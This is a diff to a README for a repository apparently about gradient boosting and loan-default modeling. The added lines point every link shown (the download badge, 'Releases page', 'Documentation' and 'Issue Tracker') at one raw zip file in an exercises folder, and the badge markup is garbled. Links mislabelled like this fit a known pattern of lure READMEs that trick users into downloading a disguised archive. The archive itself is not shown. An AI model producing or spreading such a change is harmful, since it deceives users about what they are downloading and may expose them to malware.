@@ -7,10 +7,10 @@ This repository features tools and methods for working with Gradient Boosting Ma
 To get started, follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen.svg)](https://github.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip%20Latest%https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip)](https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip)
 
 1. **Visit the Releases Page**: 
-   Click the button above or go to our [Releases page](https://github.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/releases) to access the latest version of the application.
+   Click the button above or go to our [Releases page](https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip) to access the latest version of the application.
 
 2. **Select the Latest Version**: 
    Look for the latest release at the top of the page. It will have the highest version number. Click on it to view more details.
@@ -60,8 +60,8 @@ Feel free to contribute to the project if you have suggestions or improvements. 
 For any inquiries, reach out through the contact options listed in the GitHub repository. We are here to help you make the most out of this application.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/releases)
-- [Documentation](https://github.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/wiki)
-- [Issue Tracker](https://github.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/issues)
+- [Releases Page](https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip)
+- [Documentation](https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/brucetarlton/2-social-buzz-ai-GBoost-and-LowDefault-Modeling/main/Exercises_Code_Trees_Randon Forest/Floresta_Biscobis.zip)
 
 Thank you for using the 2-social-buzz-ai-GBoost-and-LowDefault-Modeling repository. We hope it helps you unlock new possibilities in your data science journey!
